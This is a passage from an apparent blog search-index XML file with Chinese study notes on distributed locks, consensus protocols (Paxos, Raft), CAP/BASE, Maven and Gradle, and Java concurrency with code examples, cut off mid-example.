五、安全性要求系统在应对各种攻击手段时能够有可靠的应对措施。]]></content>
      <categories>
        <category>系统设计</category>
      </categories>
      <tags>
        <tag>系统设计基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式]]></title>
    <url>%2F2019%2F01%2F25%2F%E5%88%86%E5%B8%83%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[一、分布式锁在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。 阻塞锁通常使用互斥量来实现： 互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态； 互斥量为 1 表示未锁定状态。 1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。 数据库的唯一索引获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否存于锁定状态。 存在以下几个问题： 锁没有失效时间，解锁失败的话其它进程无法再获得该锁。 只能是非阻塞锁，插入失败直接就报错了，无法重试。 不可重入，已经获得锁的进程也必须重新获取锁。 Redis 的 SETNX 指令使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。 SETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。 EXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。 Redis 的 RedLock 算法使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。 尝试从 N 个相互独立 Redis 实例获取锁； 计算获取锁消耗的时间，只有当这个时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，那么就认为锁获取成功了； 如果锁获取失败，就到每个实例上释放锁。 Zookeeper 的有序节点1. Zookeeper 抽象模型Zookeeper 提供了一种树形结构级的命名空间，/app1/p_1 节点的父节点为 /app1。 2. 节点类型 永久节点：不会因为会话结束或者超时而消失； 临时节点：如果会话结束或者超时就会消失； 有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，以此类推。 3. 监听器为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。 4. 分布式锁实现 创建一个锁目录 /lock； 当一个客户端需要获取锁时，在 /lock 下创建临时的且有序的子节点； 客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁； 执行业务代码，完成后，删除对应的子节点。 5. 会话超时如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，Zookeeper 分布式锁不会出现数据库的唯一索引实现的分布式锁释放锁失败问题。 6. 羊群效应一个节点未获得锁，只需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应），而我们只希望它的后一个子节点收到通知。 二、分布式事务指事务的操作位于不同的节点上，需要保证事务的 ACID 特性。 例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。 本地消息表本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性，并且使用了消息队列来保证最终一致性。 在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。 之后将本地消息表中的消息转发到 Kafka 等消息队列中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。 在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。 2PC两阶段提交（Two-phase Commit，2PC），通过引入协调者（Coordinator）来协调参与者的行为，并最终决定这些参与者是否要真正执行事务。 1. 运行过程1.1 准备阶段协调者询问参与者事务是否执行成功，参与者发回事务执行结果。 1.2 提交阶段如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。 需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。 2. 存在的问题2.1 同步阻塞所有事务参与者在等待其它参与者响应的时候都处于同步阻塞状态，无法进行其它操作。 2.2 单点问题协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在阶段二发生故障，所有参与者会一直等待，无法完成其它操作。 2.3 数据不一致在阶段二，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。 2.4 太过保守任意一个节点失败就会导致整个事务失败，没有完善的容错机制。 三、CAP分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。 一致性一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。 对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。 可用性可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。 在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。 分区容忍性网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。 在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。 权衡在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。 可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时， 为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用性； 为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致。 四、BASEBASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。 BASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。 基本可用指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。 例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。 软状态指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。 最终一致性最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。 ACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。 在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。 五、Paxos用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。 主要有三类节点： 提议者（Proposer）：提议一个值； 接受者（Acceptor）：对每个提议进行投票； 告知者（Learner）：被告知投票的结果，不参与投票过程。 执行过程规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。 1. Prepare 阶段下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送 Prepare 请求。 当 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n1, v1]，并且之前还未接收过 Prepare 请求，那么发送一个 Prepare 响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。 如下图，Acceptor X 在收到 [n=2, v=8] 的 Prepare 请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的 Prepare 响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。 如果 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 &gt; n2，那么就丢弃该提议请求；否则，发送 Prepare 响应，该 Prepare 响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。 如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的 Prepare 请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n &gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的 Prepare 请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 &lt;= 4，因此就发送 [n=2, v=8] 的 Prepare 响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。 2. Accept 阶段当一个 Proposer 接收到超过一半 Acceptor 的 Prepare 响应时，就可以发送 Accept 请求。 Proposer A 接收到两个 Prepare 响应之后，就发送 [n=2, v=8] Accept 请求。该 Accept 请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。 Proposer B 过后也收到了两个 Prepare 响应，因此也开始发送 Accept 请求。需要注意的是，Accept 请求的 v 需要取它收到的最大提议编号对应的 v 值，也就是 8。因此它发送 [n=4, v=8] 的 Accept 请求。 3. Learn 阶段Acceptor 接收到 Accept 请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送 Learn 提议给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。 约束条件1. 正确性指只有一个提议值会生效。 因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。 2. 可终止性指最后总会有一个提议生效。 Paxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。 六、RaftRaft 也是分布式一致性协议，主要是用来竞选主节点。 单个 Candidate 的竞选有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。 下图展示一个分布式系统的最初阶段，此时只有 Follower 没有 Leader。Node A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。 此时 Node A 发送投票请求给其它所有节点。 其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。 之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。 多个 Candidate 竞选 如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票。例如下图中 Node B 和 Node D 都获得两票，需要重新开始投票。 由于每个节点设置的随机竞选超时时间不同，因此下一次再次出现多个 Candidate 并获得同样票数的概率很低。 数据同步 来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。 Leader 会把修改复制到所有 Follower。 Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。 此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。]]></content>
      <categories>
        <category>系统设计</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[构建工具]]></title>
    <url>%2F2019%2F01%2F23%2F%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[一、构建工具的作用构建工具是用于构建项目的自动化工具，主要包含以下工作： 依赖管理不再需要手动导入 Jar 依赖包，并且可以自动处理依赖关系，也就是说某个依赖如果依赖于其它依赖，构建工具可以帮助我们自动处理这种依赖关系。 运行单元测试不再需要在项目代码中添加测试代码，从而避免了污染项目代码。 将源代码转化为可执行文件包含预处理、编译、汇编、链接等步骤。 将可执行文件进行打包不再需要使用 IDE 将应用程序打包成 Jar 包。 发布到生产服务器上不再需要通过 FTP 将 Jar 包上传到服务器上。 二、Java 主流构建工具主要包括 Ant、Maven 和 Gradle。 Gradle 和 Maven 的区别是，它使用 Groovy 这种特定领域语言（DSL）来管理构建脚本，而不再使用 XML 这种标记性语言。因为项目如果庞大的话，XML 很容易就变得臃肿。 例如要在项目中引入 Junit，Maven 的代码如下： 123456789101112131415161718&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;jizg.study.maven.hello&lt;/groupId&gt; &lt;artifactId&gt;hello-first&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.10&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 而 Gradle 只需要几行代码： 123dependencies &#123; testCompile "junit:junit:4.10"&#125; 三、Maven概述提供了项目对象模型（POM）文件来管理项目的构建。 仓库仓库的搜索顺序为：本地仓库、中央仓库、远程仓库。 本地仓库用来存储项目的依赖库； 中央仓库是下载依赖库的默认位置； 远程仓库，因为并非所有的库存储在中央仓库，或者中央仓库访问速度很慢，远程仓库是中央仓库的补充。 POMPOM 代表项目对象模型，它是一个 XML 文件，保存在项目根目录的 pom.xml 文件中。 123456&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; [groupId, artifactId, version, packaging, classifier] 称为一个项目的坐标，其中 groupId、artifactId、version 必须定义，packaging 可选（默认为 Jar），classifier 不能直接定义的，需要结合插件使用。 groupId：项目组 Id，必须全球唯一； artifactId：项目 Id，即项目名； version：项目版本； packaging：项目打包方式。 依赖原则1. 依赖路径最短优先原则12A -&gt; B -&gt; C -&gt; X(1.0)A -&gt; D -&gt; X(2.0) 由于 X(2.0) 路径最短，所以使用 X(2.0)。 2. 声明顺序优先原则12A -&gt; B -&gt; X(1.0)A -&gt; C -&gt; X(2.0) 在 POM 中最先声明的优先，上面的两个依赖如果先声明 B，那么最后使用 X(1.0)。 3. 覆写优先原则子 POM 内声明的依赖优先于父 POM 中声明的依赖。 解决依赖冲突找到 Maven 加载的 Jar 包版本，使用 mvn dependency:tree 查看依赖树，根据依赖原则来调整依赖在 POM 文件的声明顺序。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java并发]]></title>
    <url>%2F2019%2F01%2F19%2Fjava%E5%B9%B6%E5%8F%91%2F</url>
    <content type="text"><![CDATA[一、线程状态转换 新建（New）创建后尚未启动。 可运行（Runnable）可能正在运行，也可能正在等待 CPU 时间片。 包含了操作系统线程状态中的 Running 和 Ready。 阻塞（Blocked）等待获取一个排它锁，如果其线程释放了锁就会结束此状态。 无限期等待（Waiting）等待其它线程显式地唤醒，否则不会被分配 CPU 时间片。 进入方法 退出方法 没有设置 Timeout 参数的 Object.wait() 方法 Object.notify() / Object.notifyAll() 没有设置 Timeout 参数的 Thread.join() 方法 被调用的线程执行完毕 LockSupport.park() 方法 LockSupport.unpark(Thread) 限期等待（Timed Waiting）无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒。 调用 Thread.sleep() 方法使线程进入限期等待状态时，常常用“使一个线程睡眠”进行描述。 调用 Object.wait() 方法使线程进入限期等待或者无限期等待时，常常用“挂起一个线程”进行描述。 睡眠和挂起是用来描述行为，而阻塞和等待用来描述状态。 阻塞和等待的区别在于，阻塞是被动的，它是在等待获取一个排它锁。而等待是主动的，通过调用 Thread.sleep() 和 Object.wait() 等方法进入。 进入方法 退出方法 Thread.sleep() 方法 时间结束 设置了 Timeout 参数的 Object.wait() 方法 时间结束 / Object.notify() / Object.notifyAll() 设置了 Timeout 参数的 Thread.join() 方法 时间结束 / 被调用的线程执行完毕 LockSupport.parkNanos() 方法 LockSupport.unpark(Thread) LockSupport.parkUntil() 方法 LockSupport.unpark(Thread) 死亡（Terminated）可以是线程结束任务之后自己结束，或者产生了异常而结束。 二、使用线程有三种使用线程的方法： 实现 Runnable 接口； 实现 Callable 接口； 继承 Thread 类。 实现 Runnable 和 Callable 接口的类只能当做一个可以在线程中运行的任务，不是真正意义上的线程，因此最后还需要通过 Thread 来调用。可以说任务是通过线程驱动从而执行的。 实现 Runnable 接口需要实现 run() 方法。 通过 Thread 调用 start() 方法来启动线程。 12345public class MyRunnable implements Runnable &#123; public void run() &#123; // ... &#125;&#125; 12345public static void main(String[] args) &#123; MyRunnable instance = new MyRunnable(); Thread thread = new Thread(instance); thread.start();&#125; 实现 Callable 接口与 Runnable 相比，Callable 可以有返回值，返回值通过 FutureTask 进行封装。 12345public class MyCallable implements Callable&lt;Integer&gt; &#123; public Integer call() &#123; return 123; &#125;&#125; 1234567public static void main(String[] args) throws ExecutionException, InterruptedException &#123; MyCallable mc = new MyCallable(); FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(mc); Thread thread = new Thread(ft); thread.start(); System.out.println(ft.get());&#125; 继承 Thread 类同样也是需要实现 run() 方法，因为 Thread 类也实现了 Runable 接口。 当调用 start() 方法启动一个线程时，虚拟机会将该线程放入就绪队列中等待被调度，当一个线程被调度时会执行该线程的 run() 方法。 12345public class MyThread extends Thread &#123; public void run() &#123; // ... &#125;&#125; 1234public static void main(String[] args) &#123; MyThread mt = new MyThread(); mt.start();&#125; 实现接口 VS 继承 Thread实现接口会更好一些，因为： Java 不支持多重继承，因此继承了 Thread 类就无法继承其它类，但是可以实现多个接口； 类可能只要求可执行就行，继承整个 Thread 类开销过大。 三、基础线程机制ExecutorExecutor 管理多个异步任务的执行，而无需程序员显式地管理线程的生命周期。这里的异步是指多个任务的执行互不干扰，不需要进行同步操作。 主要有三种 Executor： CachedThreadPool：一个任务创建一个线程； FixedThreadPool：所有任务只能使用固定大小的线程； SingleThreadExecutor：相当于大小为 1 的 FixedThreadPool。 1234567public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 5; i++) &#123; executorService.execute(new MyRunnable()); &#125; executorService.shutdown();&#125; Daemon守护线程是程序运行时在后台提供服务的线程，不属于程序中不可或缺的部分。 当所有非守护线程结束时，程序也就终止，同时会杀死所有守护线程。 main() 属于非守护线程。 使用 setDaemon() 方法将一个线程设置为守护线程。 1234public static void main(String[] args) &#123; Thread thread = new Thread(new MyRunnable()); thread.setDaemon(true);&#125; sleep()Thread.sleep(millisec) 方法会休眠当前正在执行的线程，millisec 单位为毫秒。 sleep() 可能会抛出 InterruptedException，因为异常不能跨线程传播回 main() 中，因此必须在本地进行处理。线程中抛出的其它异常也同样需要在本地进行处理。 1234567public void run() &#123; try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;&#125; yield()对静态方法 Thread.yield() 的调用声明了当前线程已经完成了生命周期中最重要的部分，可以切换给其它线程来执行。该方法只是对线程调度器的一个建议，而且也只是建议具有相同优先级的其它线程可以运行。 123public void run() &#123; Thread.yield();&#125; 四、中断一个线程执行完毕之后会自动结束，如果在运行过程中发生异常也会提前结束。 InterruptedException通过调用一个线程的 interrupt() 来中断该线程，如果该线程处于阻塞、限期等待或者无限期等待状态，那么就会抛出 InterruptedException，从而提前结束该线程。但是不能中断 I/O 阻塞和 synchronized 锁阻塞。 对于以下代码，在 main() 中启动一个线程之后再中断它，由于线程中调用了 Thread.sleep() 方法，因此会抛出一个 InterruptedException，从而提前结束线程，不执行之后的语句。 1234567891011121314public class InterruptExample &#123; private static class MyThread1 extends Thread &#123; @Override public void run() &#123; try &#123; Thread.sleep(2000); System.out.println("Thread run"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) throws InterruptedException &#123; Thread thread1 = new MyThread1(); thread1.start(); thread1.interrupt(); System.out.println("Main run");&#125; 123456Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at InterruptExample.lambda$main$0(InterruptExample.java:5) at InterruptExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) interrupted()如果一个线程的 run() 方法执行一个无限循环，并且没有执行 sleep() 等会抛出 InterruptedException 的操作，那么调用线程的 interrupt() 方法就无法使线程提前结束。 但是调用 interrupt() 方法会设置线程的中断标记，此时调用 interrupted() 方法会返回 true。因此可以在循环体中使用 interrupted() 方法来判断线程是否处于中断状态，从而提前结束线程。 123456789101112public class InterruptExample &#123; private static class MyThread2 extends Thread &#123; @Override public void run() &#123; while (!interrupted()) &#123; // .. &#125; System.out.println("Thread end"); &#125; &#125;&#125; 12345public static void main(String[] args) throws InterruptedException &#123; Thread thread2 = new MyThread2(); thread2.start(); thread2.interrupt();&#125; 1Thread end Executor 的中断操作调用 Executor 的 shutdown() 方法会等待线程都执行完毕之后再关闭，但是如果调用的是 shutdownNow() 方法，则相当于调用每个线程的 interrupt() 方法。 以下使用 Lambda 创建线程，相当于创建了一个匿名内部线程。 12345678910111213public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; try &#123; Thread.sleep(2000); System.out.println("Thread run"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); executorService.shutdownNow(); System.out.println("Main run");&#125; 12345678Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ExecutorInterruptExample.lambda$main$0(ExecutorInterruptExample.java:9) at ExecutorInterruptExample$$Lambda$1/1160460865.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 如果只想中断 Executor 中的一个线程，可以通过使用 submit() 方法来提交一个线程，它会返回一个 Future&lt;?&gt; 对象，通过调用该对象的 cancel(true) 方法就可以中断线程。 1234Future&lt;?&gt; future = executorService.submit(() -&gt; &#123; // ..&#125;);future.cancel(true); 五、互斥同步Java 提供了两种锁机制来控制多个线程对共享资源的互斥访问，第一个是 JVM 实现的 synchronized，而另一个是 JDK 实现的 ReentrantLock。 synchronized1. 同步一个代码块 12345public void func() &#123; synchronized (this) &#123; // ... &#125;&#125; 它只作用于同一个对象，如果调用两个对象上的同步代码块，就不会进行同步。 对于以下代码，使用 ExecutorService 执行了两个线程，由于调用的是同一个对象的同步代码块，因此这两个线程会进行同步，当一个线程进入同步语句块时，另一个线程就必须等待。 12345678910public class SynchronizedExample &#123; public void func1() &#123; synchronized (this) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e1.func1());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 对于以下代码，两个线程调用了不同对象的同步代码块，因此这两个线程就不需要同步。从输出结果可以看出，两个线程交叉执行。 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e2.func1());&#125; 10 0 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9 2. 同步一个方法 123public synchronized void func () &#123; // ...&#125; 它和同步代码块一样，作用于同一个对象。 3. 同步一个类 12345public void func() &#123; synchronized (SynchronizedExample.class) &#123; // ... &#125;&#125; 作用于整个类，也就是说两个线程调用同一个类的不同对象上的这种同步语句，也会进行同步。 12345678910public class SynchronizedExample &#123; public void func2() &#123; synchronized (SynchronizedExample.class) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; &#125;&#125; 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func2()); executorService.execute(() -&gt; e2.func2());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 4. 同步一个静态方法 123public synchronized static void fun() &#123; // ...&#125; 作用于整个类。 ReentrantLockReentrantLock 是 java.util.concurrent（J.U.C）包中的锁。 123456789101112131415public class LockExample &#123; private Lock lock = new ReentrantLock(); public void func() &#123; lock.lock(); try &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; finally &#123; lock.unlock(); // 确保释放锁，从而避免发生死锁。 &#125; &#125;&#125; 123456public static void main(String[] args) &#123; LockExample lockExample = new LockExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; lockExample.func()); executorService.execute(() -&gt; lockExample.func());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 比较1. 锁的实现 synchronized 是 JVM 实现的，而 ReentrantLock 是 JDK 实现的。 2. 性能 新版本 Java 对 synchronized 进行了很多优化，例如自旋锁等，synchronized 与 ReentrantLock 大致相同。 3. 等待可中断 当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情。 ReentrantLock 可中断，而 synchronized 不行。 4. 公平锁 公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁。 synchronized 中的锁是非公平的，ReentrantLock 默认情况下也是非公平的，但是也可以是公平的。 5. 锁绑定多个条件 一个 ReentrantLock 可以同时绑定多个 Condition 对象。 使用选择除非需要使用 ReentrantLock 的高级功能，否则优先使用 synchronized。这是因为 synchronized 是 JVM 实现的一种锁机制，JVM 原生地支持它，而 ReentrantLock 不是所有的 JDK 版本都支持。并且使用 synchronized 不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。 六、线程之间的协作当多个线程可以一起工作去解决某个问题时，如果某些部分必须在其它部分之前完成，那么就需要对线程进行协调。 join()在线程中调用另一个线程的 join() 方法，会将当前线程挂起，而不是忙等待，直到目标线程结束。 对于以下代码，虽然 b 线程先启动，但是因为在 b 线程中调用了 a 线程的 join() 方法，b 线程会等待 a 线程结束才继续执行，因此最后能够保证 a 线程的输出先于 b 线程的输出。 1234567891011121314151617181920212223242526272829303132333435public class JoinExample &#123; private class A extends Thread &#123; @Override public void run() &#123; System.out.println("A"); &#125; &#125; private class B extends Thread &#123; private A a; B(A a) &#123; this.a = a; &#125; @Override public void run() &#123; try &#123; a.join(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("B"); &#125; &#125; public void test() &#123; A a = new A(); B b = new B(a); b.start(); a.start(); &#125;&#125; 1234public static void main(String[] args) &#123; JoinExample example = new JoinExample(); example.test();&#125; 12AB wait() notify() notifyAll()调用 wait() 使得线程等待某个条件满足，线程在等待时会被挂起，当其他线程的运行使得这个条件满足时，其它线程会调用 notify() 或者 notifyAll() 来唤醒挂起的线程。 它们都属于 Object 的一部分，而不属于 Thread。 只能用在同步方法或者同步控制块中使用，否则会在运行时抛出 IllegalMonitorStateException。 使用 wait() 挂起期间，线程会释放锁。这是因为，如果没有释放锁，那么其它线程就无法进入对象的同步方法或者同步控制块中，那么就无法执行 notify() 或者 notifyAll() 来唤醒挂起的线程，造成死锁。 12345678910111213141516public class WaitNotifyExample &#123; public synchronized void before() &#123; System.out.println("before"); notifyAll(); &#125; public synchronized void after() &#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("after"); &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); WaitNotifyExample example = new WaitNotifyExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter wait() 和 sleep() 的区别 wait() 是 Object 的方法，而 sleep() 是 Thread 的静态方法； wait() 会释放锁，sleep() 不会。 await() signal() signalAll()java.util.concurrent 类库中提供了 Condition 类来实现线程之间的协调，可以在 Condition 上调用 await() 方法使线程等待，其它线程调用 signal() 或 signalAll() 方法唤醒等待的线程。 相比于 wait() 这种等待方式，await() 可以指定等待的条件，因此更加灵活。 使用 Lock 来获取一个 Condition 对象。 123456789101112131415161718192021222324252627public class AwaitSignalExample &#123; private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); public void before() &#123; lock.lock(); try &#123; System.out.println("before"); condition.signalAll(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void after() &#123; lock.lock(); try &#123; condition.await(); System.out.println("after"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125; &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); AwaitSignalExample example = new AwaitSignalExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter 七、J.U.C - AQSjava.util.concurrent（J.U.C）大大提高了并发性能，AQS 被认为是 J.U.C 的核心。 CountDownLatch用来控制一个线程等待多个线程。 维护了一个计数器 cnt，每次调用 countDown() 方法会让计数器的值减 1，减到 0 的时候，那些因为调用 await() 方法而在等待的线程就会被唤醒。 1234567891011121314151617public class CountdownLatchExample &#123; public static void main(String[] args) throws InterruptedException &#123; final int totalThread = 10; CountDownLatch countDownLatch = new 